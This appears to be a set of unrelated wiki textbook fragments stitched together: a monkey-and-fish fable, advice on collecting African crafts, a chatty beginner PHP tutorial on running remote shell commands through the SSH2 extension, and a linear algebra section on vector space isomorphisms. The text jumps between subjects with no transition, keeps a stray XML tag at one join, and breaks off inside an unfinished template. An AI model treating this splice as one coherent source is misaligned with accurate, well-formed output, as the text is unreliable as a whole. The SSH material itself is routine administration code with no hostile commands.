;Story: It was the rainy season, and the river had flooded its banks.  The animals were all fleeing for their lives as the river rushed down and carried everything away.  Many animals died in the flood, but not the monkeys.  Because of their great agility, the monkeys were able to climb the trees and escape the flood waters.  As they sat in the trees, they noticed the fish swimming in the current.  

:The monkeys were very concerned about the fish, saying &quot;Unless we do something, these fish are going to drown!&quot;  So the monkeys decided to make their way to the edge of the river where the water was not so deep.  &quot;From there, we will be able to save these legless creatures.&quot;  The monkey's set about their task, grabbing the fish from the river and heaping them in a great pile.  When they were finished they saw that the fish were all motionless.  &quot;The fish are sleeping now because they are so tired.  They struggled against us because they did not know our good intentions.&quot; they said to one another.  &quot;When they awake, they will be so happy that we saved them.&quot;

;Moral: Before you can help someone, you must understand their situation.

==4. Make a collection of at least 15 objects manufactured by African tribes (other than your own).==
Unless you live in Africa or are able to visit there, this requirement may end up costing a substantial amount of money.  It may also take a prolonged amount of time to complete your collection.  If you would like to shop for African objects online, we recommend that you apply the following terms to an Internet search engine:
*Africa+gifts
*Africa+crafts
*Africa+imports
*African+artisans
If you live in a large city (or near one), you may be able to find a local shop specializing in African imports.  You could also check for a museum of African history and check their gift shop.  If you know some immigrants from Africa, you may be able to trade with them.

      <text xml:space="preserve">{{formatting}}

PHP has a [http://us2.php.net/manual/en/book.ssh2.php class] that allows you to connect to servers through SSH. This tutorial explains how to use it. 

'''Note to WikiBooks admins: yes, I know it's messy, I'll make it look nice really soon :) I just think that WikiBooks was the most appropriate place to dump the tutorial since the php.net comment section thought it was a bit too long :P 
'''

'''Note to Readers:''' As you probably can see...this is a really really long tutorial. Not because it's a hard concept. But because I want to explain it in such detail that ANYBODY can get it. If you have a little bit of experience in php already, it's fine too. Look through the source code I showed below and if you don't understand a line, just look for it in my tutorial. I marked off 3 very important concepts with a bunch of *********s.

Hope this helps a buncha people. It's my first time doing such an extensive tutorial. So gimmie your input :)

I've had quite a bit of trouble getting ssh2 to work, mainly because I didn't understand the concepts behind a lot of the commands used. That's why when I tried the scripts given by different users below, the didn't work. I did a bit of research on each of the functions users used...and I've made an (almost) failsafe script. And most importantly I will explain what exactly is happening in the code, unlike a lot of users here, explain what every step does.

Here's the code. The function you will use is readwrite. What it does is it connects through ssh using username/password authentication, sends a command and looks for a certain output. If it finds that output it returns true. Obviously you will want to do something different (ex: get ALL the output of a command, run multiple commands, etc). That's why I will explain exactly what is happening in every line. Trust me, if you don't understand a part of the script READ THE EXPLANATION!, you don't want to take any shortcuts here, or you will get very unexpected results if your situation is a slightly different from mine.

== Full Script ==
&lt;source lang=php&gt;
function readwrite ($write, $lookfor,$ip,$user,$pass) {
    flush(); //Write Whatever we have before

    //Connect and Authenticate
    $connection = ssh2_connect($ip) or die (&quot;can't connect&quot;);
    ssh2_auth_password($connection,$user,$pass) or die(&quot;can't auth&quot;);

    //Start the Shell
    $shell = ssh2_shell($connection,&quot;xterm&quot;);

    //Here we are waiting for Shell to initialize
    usleep(200000); //increase this a bit if you get unexpected results

    $write = &quot;echo '[start]'; {$write}; echo '[end]'&quot;;
    
    $out = user_exec($shell, $write);
    fclose($shell);
    if(stristr($out, $lookfor)) { //it exists
            return true;
    }

}


function user_exec($shell,$cmd) {
    fwrite($shell,$cmd . PHP_EOL); //write to the shell
    $output = &quot;&quot;; //will store our output
    $start = false; //have we started yet
    $start_time = time(); //the time sarted
    $max_time = 10; //time in seconds
    while(((time()-$start_time) &lt; $max_time)) { //if the x seconds haven't passed
        $line = fgets($shell); //get the next line of output
        if(!stristr($line,$cmd)) { //we don't want output that was out command (because it also contains [start] and [end]
            if(preg_match('/\[start\]/',$line)) { //if we see that [start] is in the line that means we started
                $start = true; //set start to true
            }
            elseif(preg_match('/\[end\]/',$line)) { //we're done
                    return $output; //return what we have (last line)
             }
            elseif($start &amp;&amp; isset($line) &amp;&amp; $line != &quot;&quot;) 
            {
                    $output = $line; //return only last line (.= for all lines)
            }
        }
    }
}
&lt;/source&gt;



== Script Explanation ==
=== ReadWrite Header ===
&lt;source lang=php&gt;
function readwrite ($write, $lookfor,$ip,$user,$pass) {
&lt;/source&gt;
This is a function header for my readwrite function. It accepts 5 parameters:

==== In Depth ====
===== $write =====
This is the command we want to send (ex: cat logfile). It can be any valid bash command. 

NOTE: In case you don't know already, you have to escape all characters that php sees as &quot;special&quot;, such as $ and quotes. For example if I wanted to run $? (prints out the exit status) I will have to escape $ to \$.
If you want to send multiple commands you can separate them with ';' (ex: command1;command2;command3...)
Another note is you might want to test out your commands in a terminal before you use them in a script. Remember that what you see in your terminal is what you'll get in the script

===== $lookfor =====
In my situation I was looking for shell to return a certain value (ex: the exit status of my previous command). So in my situation, if I was looking for a successful run, it would be &quot;0&quot;. 

===== $ip, $user, $pass =====
These are pretty self explanatory. Basically it's the IP that we want to connect to (or hostname or domain name or however you access your remote computer), and the username and password. It is NOT your current computer's un/pw. It's the REMOTE computer's username and password. Note that the SSH2 class also supports public key authentication. I haven't tried it but if anybody wants me to try and make a tutorial shoot me an email.

That's is for our header. Remember...this is MY function. It does a specific tasks that I want it to (that is look at the last line of output and return true if it matches $lookfor) when given command $write. If you have a different purpose than mine then you have to edit this script accordingly. If you need help, email me, I will be glad to help!

=== Flush() Command ===
&lt;source lang=php&gt;
    flush(); //Write Whatever we have before
&lt;/source&gt;

This is optional. In my case I was running readwrite in a loop and I wanted to see the results as they came up. What flush() does is it outputs whatever we have in our echo buffer to the user (as opposed to loading the entire script first and then spitting out the echo buffer). Correct me if I'm wrong on this.

=== Connection ===
&lt;source lang=php&gt;
    //Connect and Authenticate
    $connection = ssh2_connect($ip) or die (&quot;can't connect&quot;);
&lt;/source&gt;
Basically what $connection is, is a resource. If you have used mysql with php you'll find this a lot easier to understand. A resource is an object which interacts with an external program (ex: after you do a mysql_connect() you have access to the mysql resource). It allows other function within your code to interact with that recourse. If it's can't connect it quits the script and gives an error (can't connect)

=== Authentication ===
&lt;source lang=php&gt;
    ssh2_auth_password($connection,$user,$pass) or die(&quot;can't auth&quot;);
&lt;/source&gt;
ssh2_auth_password is a function that can interact with the ssh resource. In this case it authenticates you with given username and password. It it can't it quits the script and gives off an error. (can't auth)

=== The Shell Stream ===
&lt;source lang=php&gt;
    //Start the Shell
    $shell = ssh2_shell($connection,&quot;xterm&quot;);
&lt;/source&gt;
$shell holds something called a STREAM. Now streams are very cool things. You can compare them to mysql_query() which is a type of a stream (I think).

==== In Depth ====
For all streams you can read them. They spit out data dynamically and there are php functions to read each line they spit out. For files, and apparently for the shell stream too there's a function called fgets. All that it does is gets the next line of text.

If you are familiar with mysql you can think of the very commonly while loop

&lt;source lang=php&gt;
while ($row = mysql_fetch_array($query))
&lt;/source&gt;

fgets is the same as mysql_fetch_array. Both mean get the next record (or line). Except mysql_fetch_array gets it is an array of columns and fgets gets it as a string. You might be wondering...why can't I just do while($line = fgets($shell)). Well.....technically you can. And for some purposes it will work very well. But I'll explain below why it's not a really good idea in *most* cases when we get to the fgets function below...

=== Wait For Shell To Initialize ===
&lt;source lang=php&gt;
    //Here we are waiting for Shell to initialize
    usleep(200000); //increase this a bit if you get unexpected results
&lt;/source&gt;

A few scripts fail to mention this. Try going in a terminal and typing ssh servername where servername is the name of the server you are trying to ssh into (or ip or domain). Login with your password. Now you'll see something like this:

&lt;source lang=bash&gt;
Linux adz-laptop 2.6.28-14-generic #46-Ubuntu SMP Wed Jul 8 07:21:34 UTC 2009 i686

&lt;/source&gt;


It takes a very short amount of time to transmit over the network. However there are cases where it can take a bit longer (ex: you are on a dialup connection)... In order to avoid this problem, you have to specify a sleep interval

What &lt;code&gt;usleep(x)&lt;/code&gt; does it tells php to wait x microseconds (1 millionth of a second) before going on. It is farely sage to make this 200,000 (1/5 of a second). If you start getting unexpected results you might want to nudge it up a bit.

=== Formatting The Command ===
&lt;source lang=php&gt;
    $write = &quot;echo '[start]'; {$write}; echo '[end]'&quot;;
&lt;/source&gt;
Remember $write from our function header? That was our command. 
The [start] part is not absolutely necessary for my purpose, but it might be for yours. So I'll explain what is happening.

fread() which is used in the user_exec function below, gets EVERYTHING that was outputted in the shell. That includes the headers I told you about in our previous example. We don't want that. We only want to see what our command outputs. That's why we first execute echo '[start]' which writes the word [start] literally onto the screen. Then it executes out command (the output from the command goes on the screen). And then it prints [end]. So in the end we should have:

[start]
output
from
command
[end]

Our user_exec function will take care of the rest. I will explain how when in happens in there...

=== Sending the Request and Getting the Output ===
&lt;source lang=php&gt;
    $out = user_exec($shell, $write);
&lt;/source&gt;
Looks like we are all set to send our request! We use a little function that one of the users below wrote called user_exec. I modified it slightly to fit my needs and I'll explain how you can too to fit yours. What php does is executes that function, and stores the resutn value into $out. $out will contain your output. In my case I just wanted the very last line. That's what $out holds in the unedited version of the script

=== Closing Shell ===
&lt;source lang=php&gt;
    fclose($shell);
&lt;/source&gt;

When we're all done it's good practice to close our shell stream. It's comparable to mysql_close().

=== Checking Out Input for Lookfor ===
&lt;source lang=php&gt;
    if(stristr($out, $lookfor)) { //it exists
            return true;
    }
&lt;/source&gt;

==== In Depth ====
stristr stands for string in string. I am looking for $lookfor in the $out which was produced above. Remember that this will only work in the case that $out is a string! If you want it to be an array...read up on foreach loops...or if you're really dumb (jk jk! you're not dumb you're just inexperienced. that can be changed with practice) email me your situation and I'll teach you how. Don't worry I like to teach :)

=== THE USER_EXEC FUNCTION ===
&lt;source lang=php&gt;
function user_exec($shell,$cmd) {
&lt;/source&gt;
Ok...remember when our user_exec function was called above...this is what is being called. We passed 2 parameters to it, the $shell stream and the command ($cmd)

=== Writing To The Shell Stream ===
&lt;source lang=php&gt;
    fwrite($shell,$cmd . PHP_EOL); //write to the shell
&lt;/source&gt;
Remember when I said you can read from streams? Guess what!!! You can write to them too!!! fwrite does just that! So we are writing...to out $shell stream, the command and PHP_EOL. PHP_EOL stands for the end of line (equivalent of you pressing enter on your keyboard). I *think* you can use \r and \n instead, but somebody reccomended using PHP_EOL instead...Can't hurt (can somebody explain why?)

=== A few Local Variables ===
&lt;source lang=php&gt;
    $output = &quot;&quot;; //will store our output
    $start = false; //have we started yet
&lt;/source&gt;
$output stores our output, and start says if we have reached [start] yet..but more on that below.

=== Timing the Loop: Why It's Important===
&lt;source lang=php&gt;
    $start_time = time(); //the time sarted
    $max_time = 10; //time in seconds
    while(((time()-$start_time) &lt; $max_time)) { //if the x seconds haven't passed
&lt;/source&gt;

Important: Say your command was to run a shell script. And it runs for...I dunno 3 seconds. This is why while($line = fgets($shell)) won't work as intended. 

Say we did use while($line = fgets($shell)...here is what will happen:
1) We started the SSH connection. Yay...
2) We got the shell stream... Yay
3) We waited a few milliseconds for the weird headers to load.
4) We wrote to the shell our command saying to run the shell script. Our big shell script is running. Remember it takes 2 seconds to run. That's a looot of time to php.
4) It starts reading in a loop. Every time fgets($shell) runs it spits out the next line. So we got through our headers in say... a half a second at the most. The strip we started is 1/4 done. Then we read the next line. UHOH!!! It doesn't exists O.o. The script hasn't outputted anything yet! Well, PHP thinks...this geezer told me to keep running fgets while it returns something. Looks like we're done here. And it exists out of our while loop
5) The shell script is still running for another 1 3/4 seconds. It screams out the output! But php doesn't hear it. So it's as if it never gave that output. Remember that saying &quot;if a tree falls in a forest and nobody hears it...does it really make a sound?&quot;. Apparently it doesn't :) (Insert me laughing @ own corny joke!!!)
Hope that example + corny joke helped to explain why the while() loop won't work in the case of running big scripts, so you might be wondering...well...then how DO we get the damn shell script's output. Here's how...

=== Timing the Loop ===
&lt;source lang=php&gt;
    $start_time = time(); //the time started
    $max_time = 10; //time in seconds
    while(((time()-$start_time) &lt; $max_time)) { //if the x seconds haven't passed
&lt;/source&gt;

It's pretty smart but also pretty simple. A user below suggested it. Here is how it works. time() gets the unix timestamp (# of seconds since the start of UNIX epoch). Huh? What? Don't worry. We just care that it's the time in seconds. If you do want to know more about time just lookup the time() function. It's...usefull...
$max_time stores the maximum amount of time the loop can run.

==== In Depth ====
&lt;source lang=php&gt;
while(((time()-$start_time) &lt; $max_time)) { //if the x seconds haven't passed
&lt;/source&gt;

Here's where the magic happens. Every time php does an iteration of the while loop it checks for a certain condition. The condition is that the max time has not elapsed yet.
Here's how it knows
Remember time()? Spits out the current time in seconds since the UNIX epoch started. Well...unsurprisingly if you called time() a minute ago and called it now, the current result for time() will be bigger... 60 bigger. Basic basic math you learned in elementary school. time() counts off the seconds from a certain date (January 1, 1970 to be exact). It will produce a whopping big number. But it doesn't matter all we care about is how many seconds the START number is less than the NOW number. That's what time()-$start_time does! Until that number reaches the max seconds we'll keep running the loop...over and over and over...It's gonna be quite a lot of iterations...but it doesn't matter.

=== Timing the Script: Why a Timeout ******* ===
Now here is the SUPER IMPORTANT PART
You '''must''' make sure that the script you are trying to run will run in less than the amount specified in $max_time. Try running the script yourself and add an extra second or two based on the amount of time it took. You might be wondering why not make the $max_time something really really big like... 1000000000000000000. Then my script will have plenty of time to run. Here's the issue...If something goes wrong in your shell script and it doesn't quit for some reason, or produce output, php doesn't know...It will think it's still running. And it will run in a near-infinite loop until your 10000000000000000 seconds have passed. That's....not good. Not good at all....So make it a *reasonable* amount.

=== Getting the Next Line ===
&lt;source lang=php&gt;
        $line = fgets($shell); //get the next line of output
&lt;/source&gt;
we get the next line in our output and put it into line. So the first few time it will be the headers and the command we just gave. if our big script is still running it's keep trying to get the next line...and failing. over..and over and over. but we don't care. eventually the script will produce some output...

=== Making Sure Our Command Isn't Included in Output ===
&lt;source lang=php&gt;
        if(!stristr($line,$cmd)) { //we don't want output that was out command (because it also contains [start] and [end]
&lt;/source&gt;
Alright, we only care about the output of our command, not all the other random crap that happens in the terminal. That's why we included echo [start] which will print out a literal [start] onto the screen telling php (below) to start looking at the output. But WAIT!!! The command we used to do that was echo '[start]'.......that contains [start] :P!!!! stristr as I explained before looks for the second parameter in the first. So if it find our command...we don't want it. Otherwise we keep going (note ! means NOT). Usefull operator

=== Checking for Start of Line ===
&lt;source lang=php&gt;
            if(preg_match('/\[start\]/',$line)) { //if we see that [start] is in the line that means we started
&lt;/source&gt;
preg_match matches parameter a in parameter b.. Kinda like stristr except backwards and it uses regular expressions (you can read up on those on http://www.regular-expressions.info/ They are really useful but...too advanced for this n00b-oriented tutorial). If you wanna know more email me (hmm....just got an idea...maybe I should make a site explaining advanced concepts to n00bs....)

&lt;source lang=php&gt;
                $start = true; //set start to true
            }
&lt;/source&gt;
Basically, if we match [start] we don't want that in our output, but we want to tell php that everything after this point is output. So we set the boolean $start to true.

&lt;source lang=php&gt;
            elseif(preg_match('/\[end\]/',$line)) { //we're done
                    return $output; //return what we have (last line)
             }
&lt;/source&gt;
if it matches [end], that means it's time to stop. So it returns our output, stored in ($output) which breaks the loop. this is stored in whatever variable we sent the result of user_exec() to.

&lt;source lang=php&gt;
            elseif($start &amp;&amp; isset($line) &amp;&amp; $line != &quot;&quot;) 
            {
&lt;/source&gt;
Well, if it wasn't the start or the end, then it could one of two things: the output we want, or the output we don't. That's that $start is for. Think back to our first if statement. If it saw [start], it set $start to true. otherwise it's false. if you remember how booleans and conditions work, the &amp;&amp; operator means to make sure that both ___ and ___ are true. so here both $start and isset($line) and $line != &quot;&quot; have to yeild TRUE. If $start was set to true by our top if block yay we go on. isset() is a functions that returns true if a certain variable... is set. Now remember our poor $line variable. For all those times that the shell script is running it isn't getting set to anything because fgets($shell) isn't returning anything!!! So basically isset($line) will check for that. If not, then well...time to restart the loop. over and over and over until something finally gets into $line. and $line != &quot;&quot; returns true if $line is NOT a blank line. We don't want blank lines...or do we...up to you. I don't for my purposes. But now you know what to do if you do.

&lt;source lang=php&gt; 
                    $output = $line; //return only last line (.= for all lines)
&lt;/source&gt;
So say all 3 of our conditions are matched. There was a [start] before this line, $line is set to something, and it's not blank. 

Important: What happens here is it resets $output to the contents of the latest line every time it runs. That's what I want. I only want the last line. It will keep replacing $output, line by line, until we read [end] in which case $output will only hold the last line. If you want ALL the output, you can do one of two things

1) Do $output .= $line . &quot;&lt;br&gt;&quot;;  &lt;- this is in the case that you are spitting out the output on screen. You APPEND (.=) to $output the contents of line and a break. 
2) Do $output[] = $line; &lt;- this adds the line to an array. So that you can analyze it further through php

That's it! Now you should understand how ever part of this script works, how to edit it, and more. Even if you're a beginner in PHP. Wasn't that easy? If you still don't get something you can email me at adz@jewc.org. It's my first time doing such a super-ultra-detailed tutorial, so I want your input!!!

We start with two examples that suggest the right definition. 

{{TextBox|1=
;Example 1.1{{anchor|exam:TwoWideIsoTwoTall}}:&lt;!--\label{exam:TwoWideIsoTwoTall}--&gt;
Consider the example mentioned above, the space of two-wide row
vectors and the space of two-tall column vectors. They are &quot;the same&quot;
in that if we associate the vectors that have the same components,
e.g.,

:&lt;math&gt;
\begin{pmatrix} 1 &amp;2 \end{pmatrix} \quad\longleftrightarrow\quad \begin{pmatrix} 1 \\ 2 \end{pmatrix}
&lt;/math&gt;

then this correspondence preserves the operations, for instance this addition

:&lt;math&gt;
\begin{pmatrix} 1 &amp;2 \end{pmatrix}+\begin{pmatrix} 3 &amp;4 \end{pmatrix}=\begin{pmatrix} 4 &amp;6 \end{pmatrix}
\quad\longleftrightarrow\quad
\begin{pmatrix} 1 \\ 2 \end{pmatrix}+\begin{pmatrix} 3 \\ 4 \end{pmatrix}=\begin{pmatrix} 4 \\ 6 \end{pmatrix}
&lt;/math&gt;

and this scalar multiplication.

:&lt;math&gt;
5\cdot\begin{pmatrix} 1  &amp;2 \end{pmatrix}=\begin{pmatrix} 5 &amp;10 \end{pmatrix}
\quad\longleftrightarrow\quad
5\cdot\begin{pmatrix} 1 \\ 2 \end{pmatrix}=\begin{pmatrix} 5 \\ 10 \end{pmatrix}
&lt;/math&gt;

More generally stated, under the correspondence

:&lt;math&gt;
\begin{pmatrix} a_0  &amp;a_1 \end{pmatrix}
\quad\longleftrightarrow\quad
\begin{pmatrix} a_0 \\ a_1 \end{pmatrix}
&lt;/math&gt;

both operations are preserved:

:&lt;math&gt;
\begin{pmatrix} a_0  &amp;a_1 \end{pmatrix}+\begin{pmatrix} b_0  &amp;b_1 \end{pmatrix}=\begin{pmatrix} a_0+b_0 &amp;a_1+b_1 \end{pmatrix}
\longleftrightarrow
\begin{pmatrix} a_0 \\ a_1 \end{pmatrix}+\begin{pmatrix} b_0  \\ b_1 \end{pmatrix}=\begin{pmatrix} a_0+b_0  \\ a_1+b_1 \end{pmatrix}
&lt;/math&gt;

and

:&lt;math&gt;
r\cdot\begin{pmatrix} a_0 &amp;a_1 \end{pmatrix}=\begin{pmatrix} ra_0 &amp;ra_1 \end{pmatrix}
\quad\longleftrightarrow\quad
r\cdot\begin{pmatrix} a_0  \\ a_1 \end{pmatrix}=\begin{pmatrix} ra_0  \\ ra_1 \end{pmatrix}
&lt;/math&gt;

(all of the variables are real numbers).
}}

{{TextBox|1=
;Example 1.2{{anchor|exam:PolyTwoIsoRThree}}:&lt;!--\label{exam:PolyTwoIsoRThree}--&gt;  
Another two spaces we can think of as &quot;the same&quot; are 
&lt;math&gt;\mathcal{P}_2&lt;/math&gt;, the space of quadratic polynomials, 
and &lt;math&gt;\mathbb{R}^3&lt;/math&gt;. A natural correspondence is this.

:&lt;math&gt;
a_0+a_1x+a_2x^2
\quad\longleftrightarrow\quad
\begin{pmatrix} a_0 \\ a_1 \\ a_2 \end{pmatrix}
\qquad\qquad (\text{e.g., }1+2x+3x^2\,\longleftrightarrow\,\begin{pmatrix} 1 \\ 2 \\ 3 \end{pmatrix})
&lt;/math&gt;

The structure is preserved: corresponding elements add in a corresponding way

:&lt;math&gt;
\begin{array}{r}
a_0+a_1x+a_2x^2\\
+\,\,b_0+b_1x+b_2x^2  \\ \hline
(a_0+b_0)+(a_1+b_1)x+(a_2+b_2)x^2
\end{array}
\quad\longleftrightarrow\quad
\begin{pmatrix} a_0 \\ a_1 \\ a_2 \end{pmatrix}
+\begin{pmatrix} b_0 \\ b_1 \\ b_2 \end{pmatrix}
=\begin{pmatrix} a_0+b_0 \\ a_1+b_1 \\ a_2+b_2 \end{pmatrix}
&lt;/math&gt;

and scalar multiplication corresponds also.

:&lt;math&gt;
r\cdot(a_0+a_1x+a_2x^2)=
(ra_0)+(ra_1)x+(ra_2)x^2
\quad\longleftrightarrow\quad
r\cdot\begin{pmatrix} a_0 \\ a_1 \\ a_2 \end{pmatrix}
=\begin{pmatrix} ra_0 \\ ra_1 \\ ra_2 \end{pmatrix}
&lt;/math&gt;
}}

;Definition 1.3{{anchor|def:Isomorphism}}:&lt;!--\label{def:Isomorphism}--&gt;
An '''isomorphism''' between two vector spaces &lt;math&gt;V&lt;/math&gt; and &lt;math&gt;W&lt;/math&gt; is a map &lt;math&gt; f:V\to W &lt;/math&gt; that 
&lt;ol type=1 start=1&gt;
&lt;li&gt; is a correspondence: &lt;math&gt;f&lt;/math&gt; is one-to-one and onto;&lt;ref&gt;More information on one-to-one and onto maps is in the [[Linear Algebra/Sets, Functions, Relations|appendix]].&lt;/ref&gt; 
&lt;li&gt; '''preserves structure:''' if &lt;math&gt; \vec{v}_1,\vec{v}_2\in V &lt;/math&gt; then

:&lt;math&gt;
f(\vec{v}_1+\vec{v}_2)=f(\vec{v}_1)+f(\vec{v}_2)
&lt;/math&gt;

and if &lt;math&gt; \vec{v}\in V &lt;/math&gt; and &lt;math&gt; r\in\mathbb{R} &lt;/math&gt; then

:&lt;math&gt;
f(r\vec{v})=r\,f(\vec{v})
&lt;/math&gt;
&lt;/ol&gt;
(we write &lt;math&gt; V\cong W &lt;/math&gt;, read &quot;&lt;math&gt; V &lt;/math&gt; is isomorphic to &lt;math&gt; W &lt;/math&gt;&quot;, when such a map exists).
}}

({{anchor|morphism}}&quot;Morphism&quot; means map, so &quot;isomorphism&quot; means a map expressing sameness.)

{{TextBox|1=
;Example 1.4{{anchor|ex:CheckMapIsIso}}:&lt;!--\label{ex:CheckMapIsIso}--&gt;
The vector space &lt;math&gt;G=\{c_1\cos\theta+c_2\sin\theta\,\big|\, c_1,c_2\in\mathbb{R}\}&lt;/math&gt; of functions of &lt;math&gt; \theta &lt;/math&gt; is isomorphic to the vector space &lt;math&gt; \mathbb{R}^2 &lt;/math&gt; under this map.

:&lt;math&gt;
c_1\cos\theta+c_2\sin\theta\stackrel{f}{\longmapsto}\begin{pmatrix} c_1 \\ c_2 \end{pmatrix}
&lt;/math&gt;

We will check this by going through the conditions in the definition.

We will first verify condition 1, that the map is a correspondence between the sets underlying the spaces.

To establish that &lt;math&gt;f&lt;/math&gt; is one-to-one, we must prove that &lt;math&gt; f(\vec{a})=f(\vec{b}) &lt;/math&gt; only when &lt;math&gt; \vec{a}=\vec{b} &lt;/math&gt;. If

:&lt;math&gt;
f(a_1\cos\theta+a_2\sin\theta)=f(b_1\cos\theta+b_2\sin\theta)
&lt;/math&gt;

then, by the definition of &lt;math&gt;f&lt;/math&gt;,

:&lt;math&gt;
\begin{pmatrix} a_1 \\ a_2 \end{pmatrix}=\begin{pmatrix} b_1 \\ b_2 \end{pmatrix}
&lt;/math&gt;

from which we can conclude that &lt;math&gt; a_1=b_1 &lt;/math&gt; and &lt;math&gt; a_2=b_2 &lt;/math&gt; because column vectors are equal only when they have equal components. We've proved that &lt;math&gt; f(\vec{a})=f(\vec{b}) &lt;/math&gt; implies that &lt;math&gt; \vec{a}=\vec{b} &lt;/math&gt;, which shows that &lt;math&gt; f &lt;/math&gt; is one-to-one.

To check that &lt;math&gt;f&lt;/math&gt; is onto we must check that any member of the codomain &lt;math&gt; \mathbb{R}^2 &lt;/math&gt; is the image of some member of the domain &lt;math&gt;G&lt;/math&gt;. But that's clear&amp;mdash;any

:&lt;math&gt;
\begin{pmatrix} x \\ y \end{pmatrix}\in \mathbb{R}^2
&lt;/math&gt;

is the image under &lt;math&gt;f&lt;/math&gt; of &lt;math&gt; x\cos\theta+y\sin\theta\in G &lt;/math&gt;.

Next we will verify condition (2), that &lt;math&gt;f&lt;/math&gt; preserves structure. 

This computation shows that &lt;math&gt; f &lt;/math&gt; preserves addition.
:&lt;math&gt;
f\bigl(\,(a_1\cos\theta+a_2\sin\theta)
+(b_1\cos\theta+b_2\sin\theta)\,\bigr)&lt;/math&gt;
::&lt;math&gt;
\begin{array}{rl}
&amp;=f\bigl(\,(a_1+b_1)\cos\theta+(a_2+b_2)\sin\theta\,\bigr)   \\
&amp;=\begin{pmatrix} a_1+b_1 \\ a_2+b_2 \end{pmatrix}   \\
&amp;=\begin{pmatrix} a_1 \\ a_2 \end{pmatrix}+\begin{pmatrix} b_1 \\ b_2 \end{pmatrix}   \\
&amp;=f(a_1\cos\theta+a_2\sin\theta)+f(b_1\cos\theta+b_2\sin\theta)
\end{array}
&lt;/math&gt;
A similar computation shows that &lt;math&gt;f&lt;/math&gt; preserves scalar multiplication.

:&lt;math&gt;\begin{array}{rl}
f\bigl(\,r\cdot(a_1\cos\theta+a_2\sin\theta)\,\bigr)
&amp;=f(\,ra_1\cos\theta+ra_2\sin\theta\,)   \\
&amp;=\begin{pmatrix} ra_1 \\ ra_2 \end{pmatrix}   \\
&amp;=r\cdot\begin{pmatrix} a_1 \\ a_2 \end{pmatrix}   \\
&amp;=r\cdot\, f(a_1\cos\theta+a_2\sin\theta)
\end{array}&lt;/math&gt;

With that, conditions (1) and (2) are verified, so we know that &lt;math&gt;f&lt;/math&gt; is an isomorphism and we can say that the spaces are isomorphic &lt;math&gt;G\cong\mathbb{R}^2&lt;/math&gt;.

{{TextBox|1=
;Example 1.5{{anchor|ex:LinComboThreeIsoPTwo}}: &lt;!--\label{ex:LinComboThreeIsoPTwo}--&gt;
Let &lt;math&gt; V &lt;/math&gt; be the space &lt;math&gt; \{c_1x+c_2y+c_3z\,\big|\, c_1,c_2,c_3\in\mathbb{R}\} &lt;/math&gt; of linear combinations of three variables &lt;math&gt;x&lt;/math&gt;, &lt;math&gt;y&lt;/math&gt;, and &lt;math&gt;z&lt;/math&gt;, under the natural addition and scalar multiplication operations. Then &lt;math&gt;V&lt;/math&gt; is isomorphic to &lt;math&gt;\mathcal{P}_2&lt;/math&gt;, the space of quadratic polynomials.

To show this we will produce an isomorphism map. There is more than one possibility; for instance, here are four.
&lt;center&gt;
&lt;math&gt;
\begin{array}{c}
c_1x+c_2y+c_3z
\end{array}  \quad
\begin{array}{rl}
\stackrel{f_1}{\longmapsto}    &amp;c_1+c_2x+c_3x^2  \\
\stackrel{f_2}{\longmapsto}    &amp;c_2+c_3x+c_1x^2  \\
\stackrel{f_3}{\longmapsto}    &amp;-c_1-c_2x-c_3x^2  \\
\stackrel{f_4}{\longmapsto}    &amp;c_1+(c_1+c_2)x+(c_1+c_3)x^2
\end{array}
&lt;/math&gt;
&lt;/center&gt;
The first map is the more natural correspondence in that it just carries the coefficients over. However, below we shall verify that the second one is an isomorphism, to underline that there are isomorphisms other than just the obvious one (showing that &lt;math&gt;f_1&lt;/math&gt; is an isomorphism is [[#exer:NatMapAlsoIso|Problem 3]]&lt;!--\ref{exer:NatMapAlsoIso}--&gt;).

To show that &lt;math&gt;f_2&lt;/math&gt; is one-to-one, we will prove that if &lt;math&gt;f_2(c_1x+c_2y+c_3z)=f_2(d_1x+d_2y+d_3z)&lt;/math&gt; then &lt;math&gt;c_1x+c_2y+c_3z=d_1x+d_2y+d_3z&lt;/math&gt;. The assumption that &lt;math&gt;f_2(c_1x+c_2y+c_3z)=f_2(d_1x+d_2y+d_3z)&lt;/math&gt; gives, by the definition of &lt;math&gt;f_2&lt;/math&gt;, that &lt;math&gt;c_2+c_3x+c_1x^2=d_2+d_3x+d_1x^2&lt;/math&gt;.
Equal polynomials have equal coefficients, so &lt;math&gt;c_2=d_2&lt;/math&gt;, &lt;math&gt;c_3=d_3&lt;/math&gt;, and &lt;math&gt;c_1=d_1&lt;/math&gt;. Thus &lt;math&gt;f_2(c_1x+c_2y+c_3z)=f_2(d_1x+d_2y+d_3z)&lt;/math&gt; implies that &lt;math&gt;c_1x+c_2y+c_3z=d_1x+d_2y+d_3z&lt;/math&gt; and therefore &lt;math&gt;f_2&lt;/math&gt; is one-to-one.

The map &lt;math&gt;f_2&lt;/math&gt; is onto because any member &lt;math&gt;a+bx+cx^2&lt;/math&gt; of the codomain is the image of some member of the domain, namely it is the image of &lt;math&gt;cx+ay+bz&lt;/math&gt;. For instance, &lt;math&gt;2+3x-4x^2&lt;/math&gt; is &lt;math&gt;f_2(-4x+2y+3z)&lt;/math&gt;.

The computations for structure preservation are like those in the prior example. This map preserves addition

:&lt;math&gt;
f_2\bigl((c_1x+c_2y+c_3z)
+(d_1x+d_2y+d_3z)\bigr)&lt;/math&gt;
::&lt;math&gt;
\begin{array}{rl}
&amp;=f_2\bigl((c_1+d_1)x+(c_2+d_2)y+(c_3+d_3)z\bigr)   \\
&amp;=(c_2+d_2)+(c_3+d_3)x+(c_1+d_1)x^2   \\
&amp;=(c_2+c_3x+c_1x^2)+(d_2+d_3x+d_1x^2)   \\
&amp;=f_2(c_1x+c_2y+c_3z)+f_2(d_1x+d_2y+d_3z)
\end{array}
&lt;/math&gt;

and scalar multiplication.

:&lt;math&gt;\begin{array}{rl}
f_2\bigl(r\cdot(c_1x+c_2y+c_3z)\bigr)
&amp;=f_2(rc_1x+rc_2y+rc_3z)   \\
&amp;=rc_2+rc_3x+rc_1x^2   \\
&amp;=r\cdot(c_2+c_3x+c_1x^2)   \\
&amp;=r\cdot\, f_2(c_1x+c_2y+c_3z)
\end{array}&lt;/math&gt;

Thus &lt;math&gt;f_2&lt;/math&gt; is an isomorphism and we write &lt;math&gt;V\cong\mathcal{P}_2&lt;/math&gt;.
}}

{{anchor|automorphism}}We are sometimes interested in an isomorphism
of a space with itself, called an '''automorphism'''. An identity map
is an automorphism. The next two examples show that there are others.

{{TextBox|1=
